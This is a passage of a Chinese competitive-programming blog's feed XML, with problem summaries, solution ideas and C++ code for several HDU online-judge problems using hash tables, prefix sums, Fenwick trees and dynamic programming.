class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="comment">//Hash Table</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 1001000</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> mod  4000007</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HashKey</span> &#123;</span></div><div class="line">    ll key;</div><div class="line">    <span class="keyword">int</span> nxt, pos;</div><div class="line">&#125;e[MAXN];</div><div class="line"><span class="keyword">int</span> link1[MAXN * <span class="number">4</span>], p;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">memset</span>(link1, <span class="number">-1</span>, <span class="keyword">sizeof</span>(link1));</div><div class="line">    p = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(ll key, <span class="keyword">int</span> pos)</span> </span>&#123;</div><div class="line">    e[p].key = key;</div><div class="line">    e[p].pos = pos &amp; <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> modKey = key % mod;</div><div class="line">    <span class="keyword">if</span> (modKey &lt; <span class="number">0</span>) modKey += mod;</div><div class="line">    e[p].nxt = link1[modKey];</div><div class="line">    link1[modKey] = p++;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Find</span><span class="params">(ll key, <span class="keyword">int</span> odd)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> modKey = key % mod;</div><div class="line">    <span class="keyword">if</span> (modKey &lt; <span class="number">0</span>) modKey += mod;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = link1[modKey]; i != <span class="number">-1</span>; i = e[i].nxt) &#123;</div><div class="line">        <span class="keyword">if</span> (e[i].key == key &amp;&amp; e[i].pos == odd) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> T, n, k, x;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;T);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> cas = <span class="number">1</span>; cas &lt;= T; cas++) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;k);</div><div class="line">        ll s = <span class="number">0</span>;</div><div class="line">        init();</div><div class="line">        add(s, <span class="number">0</span>);</div><div class="line">        <span class="keyword">bool</span> ok = <span class="literal">false</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</div><div class="line">            <span class="keyword">if</span> (i &amp; <span class="number">1</span>) s += x;</div><div class="line">            <span class="keyword">else</span> s -= x;</div><div class="line">            <span class="keyword">if</span> (!ok) &#123;</div><div class="line">                <span class="keyword">if</span> (Find(s - k, <span class="number">0</span>)) ok = <span class="literal">true</span>;</div><div class="line">                <span class="keyword">if</span> (Find(s + k, <span class="number">1</span>)) ok = <span class="literal">true</span>;</div><div class="line">                add(s, i);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d: %s.\n"</span>, cas, ok ? <span class="string">"Yes"</span> : <span class="string">"No"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=5183&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=5183&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;给定n个数的序列（A0,A1,A2…,An-1) 规定NP-sum(i,j) = Ai - Ai+1 + Ai+2 + (-1)^(j-i)Aj&lt;br&gt;现在给定一个K，问是否有一个NP-sum(i,j)=K&lt;br&gt;1≤n≤1000000,−1000000000≤ai≤1000000000,−1000000000≤K≤1000000000&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;sum[i]=a1−a2+a3…。手写一个哈希表来保存所有出现过的sum值,然后根据奇偶性分类判断在哈系表中是否存在对应的子序列满足题意&lt;/p&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="HashTable" scheme="http://yoursite.com/tags/HashTable/"/>
    
  </entry>
  
  <entry>
    <title>HDU 5084 HeHe（矩阵+强行找规律）</title>
    <link href="http://yoursite.com/2015/10/09/hdu5084/"/>
    <id>http://yoursite.com/2015/10/09/hdu5084/</id>
    <published>2015-10-09T12:00:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=5084" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=5084</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>给定一个矩阵，矩阵的形式如下：<br>M = |tn,   tn+1, …, t2<em>n-1|<br>    |tn-1, tn,   …, t2</em>n-2|<br>    |.                      |<br>    |t1,   t2,   …, tn    |<br>有Q组询问，每次询问A(x,y) 其中A = M * M</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>由于n是1000级别的，所以常规的矩阵乘无法满足条件。<br>观察发现ans[x][y]就是 a[y]<em>a[2</em>n-x] + …. + a[y+n-1]<em>a[n-x+1] 乘的这部分 a[i]</em>a[j] i+j是定值 所以 对于i+j等于某个数的，求个前缀和 最后每个值就O(1)得到了</p><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1010</span>;</div><div class="line">ll t[<span class="number">2</span> * N], f[<span class="number">3</span> * N][<span class="number">2</span> * N];</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n + <span class="number">1</span>; i &lt;= <span class="number">3</span> * n - <span class="number">1</span>; i++) &#123;</div><div class="line">        f[i][<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">2</span> * n; j++) &#123;</div><div class="line">            <span class="keyword">if</span> (i &gt; j &amp;&amp; (i - j) &lt;= <span class="number">2</span> * n - <span class="number">1</span>) f[i][j] = t[j] * t[i - j] + f[i][j - <span class="number">1</span>];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n)) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">2</span> * n; i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, t + i);</div><div class="line">        init();</div><div class="line">        ll ans = <span class="number">0</span>, ret = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> r, c, m;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;m);</div><div class="line">        <span class="keyword">while</span>(m--) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;r, &amp;c);</div><div class="line">            r = (r + ret) % n + <span class="number">1</span>;</div><div class="line">            c = (c + ret) % n + <span class="number">1</span>;</div><div class="line">            ret = f[<span class="number">2</span> * n - r + c][<span class="number">2</span> * n - r] - f[<span class="number">2</span> * n - r + c][n - r];</div><div class="line">            ans += ret;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%I64d\n"</span>, ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=5084&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=5084&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;给定一个矩阵，矩阵的形式如下：&lt;br&gt;M = |tn,   tn+1, …, t2&lt;em&gt;n-1|&lt;br&gt;    |tn-1, tn,   …, t2&lt;/em&gt;n-2|&lt;br&gt;    |.                      |&lt;br&gt;    |t1,   t2,   …, tn    |&lt;br&gt;有Q组询问，每次询问A(x,y) 其中A = M * M&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;由于n是1000级别的，所以常规的矩阵乘无法满足条件。&lt;br&gt;观察发现ans[x][y]就是 a[y]&lt;em&gt;a[2&lt;/em&gt;n-x] + …. + a[y+n-1]&lt;em&gt;a[n-x+1] 乘的这部分 a[i]&lt;/em&gt;a[j] i+j是定值 所以 对于i+j等于某个数的，求个前缀和 最后每个值就O(1)得到了&lt;/p&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="想法" scheme="http://yoursite.com/tags/%E6%83%B3%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>HDU 5021 Revenge of kNN II（二分+树状数组）</title>
    <link href="http://yoursite.com/2015/10/09/hdu5021/"/>
    <id>http://yoursite.com/2015/10/09/hdu5021/</id>
    <published>2015-10-09T11:00:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=5021" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=5021</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>给定n个点，每个点有一个值。现在有一些询问，每次用离某点距离最小的K个点的平均值来更新该点的值，如果有两个点距离相同，去index小的点。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>可以用二分来求每次离该点最近的K个点，二分离该点的距离值即可。注意一些细节问题</li><li>用树状数组来维护距离和</li></ol><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100000</span> + <span class="number">100</span>;</div><div class="line"><span class="keyword">int</span> n, q;</div><div class="line"><span class="keyword">int</span> x[N], v[N], rk[N], p[N];</div><div class="line">pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; d[N];</div><div class="line"><span class="keyword">double</span> c[N], b[N];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;T);</div><div class="line">    <span class="keyword">while</span>(T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;q);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, x + i, v + i);</div><div class="line">            d[i] = make_pair(x[i], i);</div><div class="line">            c[i] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        sort(d + <span class="number">1</span>, d + n + <span class="number">1</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            rk[d[i].second] = i;</div><div class="line">            b[i] = v[d[i].second];</div><div class="line">            p[i] = d[i].first;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt;= n; j += j &amp; -j) c[j] += b[i];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">double</span> ans = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span>(q--) &#123;</div><div class="line">            <span class="keyword">int</span> i, k, dis;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;i, &amp;k);</div><div class="line">            dis = x[i];</div><div class="line">            i = rk[i];</div><div class="line">            <span class="keyword">int</span> l = <span class="number">1</span>, r = <span class="number">1e9</span>, mid;</div><div class="line">            <span class="keyword">while</span>(l &lt; r) &#123;</div><div class="line">                mid = (l + r) &gt;&gt; <span class="number">1</span>;</div><div class="line">                <span class="keyword">int</span> sum = upper_bound(p + <span class="number">1</span>, p + n + <span class="number">1</span>, dis + mid) - lower_bound(p + <span class="number">1</span>, p + n + <span class="number">1</span>, dis - mid);</div><div class="line">                <span class="keyword">if</span> (sum &gt;= k + <span class="number">1</span>) r = mid;</div><div class="line">                <span class="keyword">else</span> l = mid + <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">int</span> L = lower_bound(p + <span class="number">1</span>, p + n + <span class="number">1</span>, dis - r) - p;</div><div class="line">            <span class="keyword">int</span> R = upper_bound(p + <span class="number">1</span>, p + n + <span class="number">1</span>, dis + r) - p - <span class="number">1</span>;</div><div class="line">            <span class="keyword">if</span> (L + k != R) &#123;</div><div class="line">                <span class="keyword">if</span> (d[L].second &lt; d[R].second) --R;</div><div class="line">                <span class="keyword">else</span> ++L;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">double</span> sum = <span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = R; j &gt; <span class="number">0</span>; j -= j &amp; -j) sum += c[j];</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = L - <span class="number">1</span>; j &gt; <span class="number">0</span>; j -= j &amp; -j) sum -= c[j];</div><div class="line">            sum -= b[i];</div><div class="line">            sum /= k;</div><div class="line">            ans += sum;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt;= n; j += j &amp; -j) c[j] += sum - b[i];</div><div class="line">            b[i] = sum;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%.3lf\n"</span>, ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=5021&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=5021&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;给定n个点，每个点有一个值。现在有一些询问，每次用离某点距离最小的K个点的平均值来更新该点的值，如果有两个点距离相同，去index小的点。&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;可以用二分来求每次离该点最近的K个点，二分离该点的距离值即可。注意一些细节问题&lt;/li&gt;
&lt;li&gt;用树状数组来维护距离和&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="树状数组" scheme="http://yoursite.com/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    
      <category term="二分" scheme="http://yoursite.com/tags/%E4%BA%8C%E5%88%86/"/>
    
  </entry>
  
  <entry>
    <title>HDU 5064 Find Sequence（LIS+dp）</title>
    <link href="http://yoursite.com/2015/10/07/hdu5064/"/>
    <id>http://yoursite.com/2015/10/07/hdu5064/</id>
    <published>2015-10-07T11:00:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=5064" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=5064</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>给定n个正整数，这n个数相加为M（0&lt;M≤2^22）。问从这n个数选出一些数，从小到大排序，使得b2-b1≤b3-b2……≤bt-bt-1。求t的最大值</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>首先考虑解的结构一定是C1,C1……C2,C3……Cm。其中C1&lt;C2&lt;……&lt;Cm。所以可以对ai去重后排序。可以知道此时的ai的个数为sqrt(M)级别的。<br>然后用dp[i][j]表示以aj结尾，ai为倒数第二个数的最优解。dp[i][j] = max(dp[k][i]) + 1, 其中ai-ak≤aj-ai<br>这样的复杂度是O(n^3),其中n为1000级别的，会TLE。<br>发现有一个优化：dp[i][j+1] = max(dp[k][i]) + 1, 其中ai-ak≤aj-ai&lt;aj+1-ai。所以重复的部分只需要计算一次即可。这样复杂度降到O(n^2)</p><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">3000</span>;</div><div class="line"><span class="keyword">int</span> n, m;</div><div class="line"><span class="keyword">int</span> a[N * N], cnt[N], dp[N][N];</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> &amp;a, <span class="keyword">int</span> b)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (a &lt; b) a = b;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;T);</div><div class="line">    <span class="keyword">while</span>(T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, a + i);</div><div class="line">        sort(a + <span class="number">1</span>, a + n + <span class="number">1</span>);</div><div class="line">        <span class="keyword">int</span> cur;</div><div class="line">        cnt[cur = <span class="number">1</span>] = <span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</div><div class="line">            <span class="keyword">if</span> (a[i] == a[cur]) cnt[cur]++;</div><div class="line">            <span class="keyword">else</span> &#123;</div><div class="line">                a[++cur] = a[i];</div><div class="line">                cnt[cur] = <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        n = cur;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) dp[i][i] = cnt[i];</div><div class="line">        <span class="keyword">int</span> k, res, ans = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            k = i;</div><div class="line">            res = dp[i][i];</div><div class="line">            change(ans, res);</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++) &#123;</div><div class="line">                <span class="keyword">for</span> (; k &gt; <span class="number">0</span> &amp;&amp; a[i] - a[k] &lt;= a[j] - a[i]; k--) change(res, dp[k][i] + <span class="number">1</span>);</div><div 